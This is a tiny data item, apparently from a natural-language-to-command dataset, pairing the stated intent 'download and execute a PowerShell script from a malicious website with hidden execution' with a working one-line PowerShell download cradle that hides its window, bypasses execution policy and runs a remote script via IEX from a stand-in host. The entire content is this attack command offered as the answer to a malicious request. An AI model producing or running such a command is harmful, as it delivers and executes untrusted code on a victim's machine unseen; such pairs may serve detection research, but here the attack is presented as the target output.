# Natural language intent:
# Download and execute a PowerShell script from a malicious website with hidden execution.

powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciouscode.ps1');"
